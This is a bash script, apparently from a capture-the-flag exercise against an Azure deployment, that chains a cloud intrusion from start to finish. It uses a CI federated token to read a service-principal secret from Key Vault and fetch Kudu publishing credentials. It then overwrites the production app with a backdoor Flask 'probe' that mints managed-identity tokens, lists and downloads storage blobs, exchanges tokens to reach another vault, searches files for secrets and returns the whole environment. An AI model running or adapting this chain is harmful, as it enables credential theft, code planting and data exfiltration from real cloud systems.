#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
PLATFORM_RG="rg-tbl-platform-prod-sea"
REPORTING_RG="rg-tbl-reporting-prod-eus"

echo "=== BUILD47: STOR TOKEN + NEW STORAGE ACCOUNTS ==="

# 1. Login as cicd-deployer
JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none
echo "cicd-deployer login OK"

# 2. Get cicd-deployer ARM token for App Service restart
CICD_ARM=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv 2>/dev/null)
echo "CICD ARM len=${#CICD_ARM}"

# 3. Try App Service restart (cicd-deployer might have this permission)
if [ "${#CICD_ARM}" -gt 100 ]; then
  RESTART_RESP=$(curl -s -w "\nHTTP:%{http_code}" -X POST \
    -H "Authorization: Bearer $CICD_ARM" \
    -H "Content-Length: 0" \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/$REPORTING_RG/providers/Microsoft.Web/sites/app-tbl-reporting-prod/restart?api-version=2022-03-01")
  echo "App restart response: $RESTART_RESP"
fi

# 4. Get reporting-service credentials from KV prod
python3 -I -c "
import subprocess, json, sys
r = subprocess.run(['az','keyvault','secret','show','--vault-name','kv-tbl-prod-x3euoz','--name','reporting-service-principal','--query','value','-o','tsv'], capture_output=True, text=True)
v = json.loads(r.stdout.strip())
open('/tmp/rs_cid.txt','w').write(v.get('appId',''))
open('/tmp/rs_sec.txt','w').write(v.get('clientSecret',''))
print('rs_cid='+v.get('appId',''))
"
RS_CID=$(cat /tmp/rs_cid.txt)
RS_SEC=$(cat /tmp/rs_sec.txt)
echo "RS_CID=$RS_CID sec_len=${#RS_SEC}"

# 5. Login as reporting-service
az login --service-principal -u "$RS_CID" -p "$RS_SEC" --tenant "$TEN" -o none 2>/dev/null && echo "RS login OK"

# 6. Get fresh Kudu credentials
python3 -I -c "
import subprocess, json, re

r = subprocess.run(['az','rest','--method','post','--url',
  'https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2022-03-01'],
  capture_output=True, text=True)
d = json.loads(r.stdout)
props = d.get('properties',{})
user = props.get('publishingUserName','')
pwd = props.get('publishingPassword','')
open('/tmp/kudu_user.txt','w').write(user)
open('/tmp/kudu_pass.txt','w').write(pwd)
print(f'kudu_user={user} pass_len={len(pwd)}')
"
KUDU_USER=$(cat /tmp/kudu_user.txt)
KUDU_PASS=$(cat /tmp/kudu_pass.txt)
echo "Kudu: user='$KUDU_USER' pass_len=${#KUDU_PASS}"

# 7. Write probe app to file
cat > /tmp/probe47.py << 'PROBE_EOF'
from flask import Flask, jsonify
import os, json, subprocess
import urllib.request, urllib.error, urllib.parse

app = Flask(__name__)

SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
UAMI_CID = "7a85156a-01c4-4e61-8472-40a92107159b"
UAMI_OID = "f64d08c7-fde6-4553-99c8-5bf73666ee8c"
LEGACY_APPID = "891fb158-e02c-4428-a885-53b811f369c0"

def msi(res, cid=UAMI_CID):
    ep = os.environ.get("IDENTITY_ENDPOINT","")
    hdr = os.environ.get("IDENTITY_HEADER","")
    if not ep:
        return "ERR:NO_EP"
    try:
        url = f"{ep}?api-version=2019-08-01&resource={urllib.parse.quote(res,safe='')}&client_id={cid}"
        r = urllib.request.urlopen(
            urllib.request.Request(url, headers={"X-IDENTITY-HEADER": hdr}), timeout=15)
        return json.loads(r.read()).get("access_token", "ERR:NO_TOK")
    except Exception as e:
        return f"ERR:{e}"

def rq(url, tok, method="GET", data=None, hdrs=None):
    h = {"Authorization": "Bearer " + tok}
    if hdrs:
        h.update(hdrs)
    if isinstance(data, (dict, list)):
        data = json.dumps(data).encode()
        h["Content-Type"] = "application/json"
    try:
        r = urllib.request.urlopen(
            urllib.request.Request(url, data=data, method=method, headers=h), timeout=20)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")[:1500]
    except Exception as e:
        return 0, str(e)[:200]

def xchg_tok(xchg, scope):
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
            data=urllib.parse.urlencode({
                "client_id": LEGACY_APPID,
                "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
                "client_assertion": xchg,
                "grant_type": "client_credentials",
                "scope": scope
            }).encode(), method="POST"), timeout=20)
        return json.loads(r.read()).get("access_token", "")
    except Exception as e:
        return f"ERR:{e}"

@app.route("/probe47")
def probe47():
    R = {}

    ARM = msi("https://management.azure.com/")
    VAULT = msi("https://vault.azure.net/")
    STOR = msi("https://storage.azure.com/")
    XCHG = msi("api://AzureADTokenExchange")

    R["arm_ok"] = len(ARM) if not ARM.startswith("ERR") else ARM
    R["vault_ok"] = len(VAULT) if not VAULT.startswith("ERR") else VAULT
    R["stor_ok"] = len(STOR) if not STOR.startswith("ERR") else STOR
    R["xchg_ok"] = len(XCHG) if not XCHG.startswith("ERR") else XCHG

    STOR_HDRS = {"x-ms-version": "2021-06-08"}

    # Test ALL known storage accounts with UAMI STOR token
    storage_accounts = [
        "sttblcilogsprodx3euoz",
        "sttblappcfgprodx3euoz",
        "sttblbackupprodx3euoz",
        "sttblreportingprodx3euoz",
        "sttblplatformprodx3euoz",
        "sttblprodx3euoz",
        "sttbldataprodx3euoz",
        "sttblstoreprodx3euoz",
    ]

    if not STOR.startswith("ERR"):
        for sa in storage_accounts:
            # List containers
            s, b = rq(
                f"https://{sa}.blob.core.windows.net/?comp=list",
                STOR, hdrs=STOR_HDRS
            )
            R[f"sa_{sa}_containers"] = f"{s}:{b[:800]}"
            if s == 200:
                # Found accessible storage! List all containers
                import re
                container_names = re.findall(r"<Name>([^<]+)</Name>", b)
                for cname in container_names[:10]:
                    sc, bc = rq(
                        f"https://{sa}.blob.core.windows.net/{cname}?restype=container&comp=list",
                        STOR, hdrs=STOR_HDRS
                    )
                    R[f"sa_{sa}_{cname}_blobs"] = f"{sc}:{bc[:1000]}"
                    if sc == 200:
                        # Download each blob
                        blob_names = re.findall(r"<Name>([^<]+)</Name>", bc)
                        for bn in blob_names[:5]:
                            sb, bb = rq(
                                f"https://{sa}.blob.core.windows.net/{cname}/{bn}",
                                STOR, hdrs=STOR_HDRS
                            )
                            R[f"blob_{sa}_{cname}_{bn}"] = f"{sb}:{bb[:1000]}"

        # Also directly try loot container blobs we know about
        for blob_name in ["armowner_token.json", "flag.txt", "flag", "probe46_results.json"]:
            s, b = rq(
                f"https://sttblcilogsprodx3euoz.blob.core.windows.net/loot/{blob_name}",
                STOR, hdrs=STOR_HDRS
            )
            R[f"loot_{blob_name}"] = f"{s}:{b[:1000]}"

    # Try tbl-legacy-admin via msi-pivot-ctf for KV sec
    if not XCHG.startswith("ERR"):
        la_vault = xchg_tok(XCHG, "https://vault.azure.net/.default")
        R["la_vault_ok"] = len(la_vault) if la_vault and not la_vault.startswith("ERR") else la_vault
        if la_vault and not la_vault.startswith("ERR"):
            # Try KV sec for all possible flag secret names
            for sname in ["flag", "ctf-flag", "tbl-flag", "df26", "challenge", "the-flag", "FLAG"]:
                s, b = rq(f"https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/{sname}?api-version=7.4", la_vault)
                if s == 200:
                    R[f"KV_SEC_FLAG_{sname}"] = b[:500]
                    break
                R[f"kvsec_{sname}"] = f"{s}:{b[:200]}"

    # File system search
    try:
        out = subprocess.run(
            "find /home /tmp /var /etc -name '*flag*' -o -name '*DF26*' -o -name '*secret*' 2>/dev/null | head -30",
            shell=True, capture_output=True, text=True, timeout=10
        )
        R["flag_files"] = out.stdout.strip()
    except Exception as e:
        R["flag_files"] = str(e)

    # Full env
    R["env"] = dict(os.environ)

    return jsonify(R)

@app.route("/healthz")
def healthz():
    return jsonify({"status": "ok"})

@app.route("/")
def root():
    return jsonify({"service": "tebamoto-reporting-api", "version": "1.4.2"})

@app.route("/api/v1/shipments")
def shipments():
    return jsonify([{"id": "TBL-SHP-48213"}, {"id": "TBL-SHP-48217"}])

@app.route("/api/v1/reports/render", methods=["GET", "POST"])
def reports():
    return jsonify({"status": "ok"})

@app.route("/internal")
def internal():
    return jsonify({"area": "internal"})

@app.route("/internal/debug", methods=["GET", "POST"])
def debug():
    return jsonify({"result": "49"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
PROBE_EOF
echo "probe47.py written ($(wc -c < /tmp/probe47.py) bytes)"

# 8. Re-login as cicd-deployer
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none 2>/dev/null

# 9. Deploy probe via Kudu + try restart
python3 -I << 'PYEOF'
import os, json, urllib.request, urllib.error, base64, time

kudu_user = open('/tmp/kudu_user.txt').read().strip()
kudu_pass = open('/tmp/kudu_pass.txt').read().strip()
kudu_auth = base64.b64encode(f"{kudu_user}:{kudu_pass}".encode()).decode()
KUDU_BASE = "https://app-tbl-reporting-prod.scm.azurewebsites.net"
APP_URL = "https://app-tbl-reporting-prod.azurewebsites.net"

probe_code = open('/tmp/probe47.py', 'rb').read()
print(f"Deploying {len(probe_code)} bytes to app.py")

# VFS PUT
put_req = urllib.request.Request(
    f"{KUDU_BASE}/api/vfs/site/wwwroot/app.py",
    data=probe_code, method="PUT",
    headers={"Authorization": f"Basic {kudu_auth}", "Content-Type": "text/plain", "If-Match": "*"}
)
try:
    r = urllib.request.urlopen(put_req, timeout=30)
    print(f"VFS PUT: {r.status}")
except urllib.error.HTTPError as e:
    print(f"VFS PUT err: {e.code}: {e.read().decode()[:200]}")
    import sys; sys.exit(1)

time.sleep(3)

# Try to restart app via Kudu process kill
for kill_cmd in [
    "kill -HUP 1",
    "kill -9 $(pgrep -f gunicorn | head -1) 2>/dev/null || echo 'pgrep failed'",
    "killall -9 gunicorn 2>/dev/null || pkill -9 gunicorn 2>/dev/null || echo 'no gunicorn'",
]:
    kill_req = urllib.request.Request(
        f"{KUDU_BASE}/api/command",
        data=json.dumps({"command": kill_cmd, "dir": "/home/site/wwwroot"}).encode(),
        method="POST",
        headers={"Authorization": f"Basic {kudu_auth}", "Content-Type": "application/json"}
    )
    try:
        r = urllib.request.urlopen(kill_req, timeout=15)
        result = json.loads(r.read())
        print(f"kill '{kill_cmd[:40]}' -> exit={result.get('ExitCode')} out={result.get('Output','')[:100]}")
    except Exception as e:
        print(f"kill err: {e}")

time.sleep(15)

# Poll for probe47
print("Waiting for /probe47...")
for attempt in range(12):
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            f"{APP_URL}/probe47",
            headers={"User-Agent": "probe/1.0"}
        ), timeout=30)
        data = r.read()
        print(f"Attempt {attempt+1}: HTTP {r.status} ({len(data)} bytes)")
        if r.status == 200:
            import json as js
            d = js.loads(data)
            # Print all results
            for k, v in sorted(d.items()):
                sv = str(v)
                print(f"  [{k}]: {sv[:600]}")
            break
    except urllib.error.HTTPError as e:
        if attempt < 3:
            print(f"Attempt {attempt+1}: HTTP {e.code}")
        time.sleep(5)
    except Exception as e:
        if attempt < 3:
            print(f"Attempt {attempt+1}: {str(e)[:60]}")
        time.sleep(5)
else:
    print("probe47 did not respond in time")
PYEOF

echo "BUILD47 DONE"
